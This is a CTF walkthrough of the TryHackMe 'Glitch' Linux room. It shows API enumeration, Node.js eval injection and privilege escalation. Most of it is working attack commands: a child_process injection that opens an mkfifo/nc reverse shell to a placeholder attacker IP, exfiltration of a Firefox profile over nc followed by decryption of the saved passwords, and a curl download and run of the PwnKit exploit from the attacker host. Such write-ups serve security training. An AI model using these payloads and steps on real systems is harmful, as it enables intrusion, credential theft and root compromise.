---
tags:
  - THM
  - Linux
  - Easy
  - API
  - RCE
  - Leakage
  - SUID
  - PwnKit
---
https://tryhackme.com/room/glitch/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.165.171 glitch.thm
```
# Scanning
```console
$ nmap -p80 -sV -sC glitch.thm

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: not allowed
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
The website is just an image, but the HTML code reveals an `/api/access` path:
```console
$ curl -s http://glitch.thm/

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>not allowed</title>

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        height: 100vh;
        width: 100%;
        background: url('img/glitch.jpg') no-repeat center center / cover;
      }
    </style>
  </head>
  <body>
    <script>
      function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
    </script>
  </body>
</html>
```
Found and decoded an **access token**:
```console
$ curl -s http://glitch.thm/api/access
{"token":"dGhpc19pc19ub3RfcmVhbA=="}

$ base64 -d <<< 'dGhpc19pc19ub3RfcmVhbA=='
this_is_not_real
```
Found `/api/items` path:
```console
$ curl -s --cookie 'token=this_is_not_real' http://glitch.thm/ | tail
      </div>
    </section>

    <section id="click-here-sec">
      <a href="#">click me.</a>
    </section>

    <script src="js/script.js"></script>
  </body>
</html>

$ curl -s --cookie 'token=this_is_not_real' http://glitch.thm/js/script.js | head
(async function () {
  const container = document.getElementById('items');
  await fetch('/api/items')
    .then((response) => response.json())
    .then((response) => {
      response.sins.forEach((element) => {
        let el = `<div class="item sins"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
        container.insertAdjacentHTML('beforeend', el);
      });
      response.errors.forEach((element) => {
```
The POST method is allowed:
```console
$ curl -s --cookie 'token=this_is_not_real' http://glitch.thm/api/items
{"sins":["lust","gluttony","greed","sloth","wrath","envy","pride"],"errors":["error","error","error","error","error","error","error","error","error"],"deaths":["death"]}

$ curl -s --cookie 'token=this_is_not_real' -X OPTIONS http://glitch.thm/api/items
GET,HEAD,POST

$ curl -s --cookie 'token=this_is_not_real' -X POST http://glitch.thm/api/items
{"message":"there_is_a_glitch_in_the_matrix"}
```
Found `cmd` as possible parameter:
```console
$ gobuster fuzz -q -c 'token=this_is_not_real' -m 'POST' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://glitch.thm/api/items?FUZZ=test' -b 400

Found: [Status=500] [Length=1081] [Word=cmd] http://glitch.thm/api/items?cmd=test
```
Looks like Node.js is using the `eval` function:
```console
$ curl -s --cookie 'token=this_is_not_real' -X POST 'http://glitch.thm/api/items?cmd=whoami' | html2text

    ReferenceError: whoami is not defined  
        at eval (eval at router.post (/var/web/routes/api.js:25:60), <anonymous>:1:1)  
        at router.post (/var/web/routes/api.js:25:60)  
        at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)  
        at next (/var/web/node_modules/express/lib/router/route.js:137:13)  
        at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)  
        at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)  
        at /var/web/node_modules/express/lib/router/index.js:281:22  
        at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)  
        at next (/var/web/node_modules/express/lib/router/index.js:275:10)  
        at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)
```
# Exploitation
Searching the web, found [this article](https://blog.appsecco.com/nodejs-and-a-simple-rce-exploit-d79001837cc6), showing how to get RCE using Node.js.

First, listen for connections:
```bash
nc -lvnp <PORT>
```
Now, send the reverse shell:
```console
$ params=$(echo -n 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f' | urlencode)

$ curl -s --cookie 'token=this_is_not_real' -X POST "http://glitch.thm/api/items?cmd=require('child_process').exec('$params')"
```
Get the **user flag**:
```bash
cat /home/user/user.txt
```
# Post-Exploitation
## Abusing SUID
Found some users:
```console
$ whoami
user

$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:user:/home/user:/bin/bash
v0id:x:1001:1001:,,,:/home/v0id:/bin/bash
```
Found `/usr/local/bin/doas` with **SUID privileges**:
```console
$ find / -perm -4000 2>/dev/null

/bin/ping
/bin/mount
/bin/fusermount
/bin/umount
/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/at
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/doas
```
The binary allows the execution of any command as another user, however the current user is not able to do it likely because of restrictions:
```console
$ /usr/local/bin/doas
usage: doas [-nSs] [-a style] [-C config] [-u user] command [args]

$ /usr/local/bin/doas -u root /bin/bash
doas: Operation not permitted
```
Found a `/home/user/.firefox/` folder. Perhaps there are stored credentials on the browser, so we compress the folder:
```console
$ ls -la /home/user

drwxr-xr-x   8 user user   4096 Jul 24 02:36 .
drwxr-xr-x   4 root root   4096 Jan 15  2021 ..
lrwxrwxrwx   1 root root      9 Jan 21  2021 .bash_history -> /dev/null
-rw-r--r--   1 user user   3771 Apr  4  2018 .bashrc
drwx------   2 user user   4096 Jan  4  2021 .cache
drwxrwxrwx   4 user user   4096 Jan 27  2021 .firefox
-rw-r--r--   1 user user 996494 Jul 24 02:31 firefox.tar.gz
drwx------   3 user user   4096 Jan  4  2021 .gnupg
drwxr-xr-x 270 user user  12288 Jan  4  2021 .npm
drwxrwxr-x   5 user user   4096 Jul 24 02:15 .pm2
drwx------   2 user user   4096 Jan 21  2021 .ssh
-rw-rw-r--   1 user user     22 Jan  4  2021 user.txt

$ cd /home/user

$ tar -cvf firefox.tar .firefox
```
In the local machine, clone the [Firefox Decrypt repository](https://github.com/unode/firefox_decrypt) and wait for file transfer:
```console
$ git clone https://github.com/unode/firefox_decrypt

$ cd firefox_decrypt/

$ nc -lnp <PORT> > firefox.tar
```
From the target machine, send the compressed file:
```bash
nc <ATTACKER-IP> <PORT> < /tmp/firefox.tar
```
Decompress the file and get some **credentials**: 
```console
$ curl -s -O http://glitch.thm:8000/firefox.tar

$ 7z x firefox.tar

$ ./firefox_decrypt.py .firefox
Select the Mozilla profile you wish to decrypt
1 -> hknqkrn7.default
2 -> b5w4643p.default-release
2

Website:   https://glitch.thm
Username: 'v0id'
Password: 'love_the_void'
```
In the target machine, become user `v0id` and now we can execute `/usr/local/bin/doas`:
```console
$ su - v0id
Password:

$ /usr/local/bin/doas -u root /bin/bash
Password:

# whoami
root
```
Get the **root flag**:
```bash
cat /root/root.txt
```
## PwnKit (alternative)
The binary `/usr/bin/pkexec` has **SUID privileges**:
```console
$ ls -l /usr/bin/pkexec
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
```
In the local machine, setup a Python server with the [PwnKit](https://github.com/ly4k/PwnKit) repository:
```console
$ git clone https://github.com/ly4k/PwnKit

$ cd PwnKit

$ python3 -m http.server 8000
```
Download and execute the exploit in the target machine:
```console
$ cd /tmp

$ curl -s -O http://<ATTACKER-IP>:8000/PwnKit

$ chmod +x PwnKit

$ ./PwnKit

# whoami
root
```